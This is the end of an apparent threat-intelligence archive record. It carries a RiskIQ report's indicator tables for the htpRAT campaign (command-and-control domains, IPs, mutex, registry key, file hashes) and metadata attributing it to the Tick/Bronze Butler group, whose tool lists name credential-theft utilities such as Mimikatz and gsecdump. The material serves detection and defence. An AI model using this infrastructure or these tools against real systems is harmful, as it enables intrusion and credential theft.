Firefox/41.0\n\nRegistry startup keyname WindowsApp\n\nqf.laoscript.org 128.199.245.204\n\nAdditional IOCs related to the ‘Other activity by the htpRAT group’ section are listed below. These contain\na raw dump of observed samples, domains and IPs. This last set of IOCs is not tracked in the public PT\nproject linked above. Also keep in mind there is a substantial amount of historical IP addresses for the\ndomains in the list below which aren’t related to current activity. They are only shone in combination with\nthe adjoining domain names. This section is quite raw and unstructured: the only connection is through\nshared infrastructure from the htpRAT campaign.\n\nAdditional network IOCs:\n\n|Description|Value|\n|---|---|\n|INI key name|{80478813-B963-4C21-953E-D51544A1863B}|\n|Runtime mutex|{3084ADEC-04CF-4981-B6A0-87DC5C385E24}|\n|Useragent|Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0|\n|Registry startup keyname|WindowsApp|\n|qf.laoscript.org|128.199.245.204|\n\n|Description|IP|\n|---|---|\n|download.laokey.com|91.109.29.115|\n||103.193.4.164|\n|ftp.laokey.com|43.249.38.250|\n||91.109.29.115|\n||128.199.245.204|\n|laokey.com|103.193.4.164|\n||43.249.38.250|\n||128.199.245.204|\n|mysqlupdate.hopto.org|43.249.38.250|\n||80.255.3.101|\n||91.109.29.115|\n\n\n-----\n\n|Description|IP|\n|---|---|\n|la.laoscript.org|103.193.4.164|\n||86.106.131.12|\n||43.249.38.250|\n||91.109.29.115|\n||128.199.245.204|\n||116.251.223.148|\n||27.255.94.75|\n||216.158.86.233|\n|download.laoscript.org|191.101.242.101|\n||119.59.123.114|\n|image.laoscript.org|115.84.101.75 (IP address for the MOFA of Laos, the server wasn’t compromised as far as we know)|\n||116.251.223.212|\n||119.59.123.114|\n||119.59.123.58|\n|la.proxyme.net|61.195.97.204|\n||128.199.245.204|\n||128.199.89.28|\n\n\nAdditional filesystem IOCs:\n\n|Filename|MD5|SHA256|\n|---|---|---|\n|favicon.ico|27b318e103985fb4872ea92df1d2f35a|56c3909c19e9fb934ef6d1f73fbfe3d05935933c0c071fc23ad ce05d545b8965|\n|-|fb7376074cd98d2ac9d957cba73d054e|5e0019485fbfa2796ec0f1315c678b4a3fb711aef5d97f42827c 363ccd163f6d|\n|-|863f83f72b2a089123619465915d69f5|e7264a8ed7ed9145e6cdbcfe55e9a0d00f4df70becb62a83496c 34548c5c7bdf|\n\n\n-----\n\nFor a full, continuously updated list of IOCs related to htpRAT, visit the RiskIQ Community Public Project\n[here: https://community.riskiq.com/projects/521b4b80-1f00-c485-ba1d-70fa223a1933](https://community.riskiq.com/projects/521b4b80-1f00-c485-ba1d-70fa223a1933)\n\n\nRiskIQ is the leader in digital threat management, providing the most comprehensive\ndiscovery, intelligence, and mitigation of threats associated with an organization’s\ndigital presence. With more than 75 percent of attacks originating outside the\nfirewall, RiskIQ allows enterprises to gain unified insight and control over web,\nsocial, and mobile exposures. Trusted by thousands of security analysts, RiskIQ’s\nplatform combines advanced internet data reconnaissance and analytics to expedite\ninvestigations, understand digital attack surfaces, assess risk, and take action to protect\nbusiness, brand, and customers. Based in San Francisco, the company is backed by\nSummit Partners, Battery Ventures, Georgian Partners, and MassMutual Ventures.\n\n\n 1 888.415.4447 [ @RiskIQ](https://twitter.com/RiskIQ)\n\n©2017 RiskIQ, Inc. All rights reserved. RiskIQ is a\nregistered trademark and Digital Footprint is a\ntrademark of RiskIQ, Inc. in the United States and other\ncountries. All other trademarks contained herein are\nproperty of their respective owners. 10_17\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/ecn72owuoet5p0f916qutvsqv20rmmps"
    ],
    "report_names": [
        "RiskIQ_htpRAT-Malware-Attacks(10-26-2017)"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1509621242,
    "ts_modification_date": 1509621246,
    "files": {
        "pdf": "https://archive.orkl.eu/83bc7df01a0a0a638d5bae228c1fcc0c34884ca4.pdf",
        "text": "https://archive.orkl.eu/83bc7df01a0a0a638d5bae228c1fcc0c34884ca4.txt",
        "img": "https://archive.orkl.eu/83bc7df01a0a0a638d5bae228c1fcc0c34884ca4.jpg"
    }
}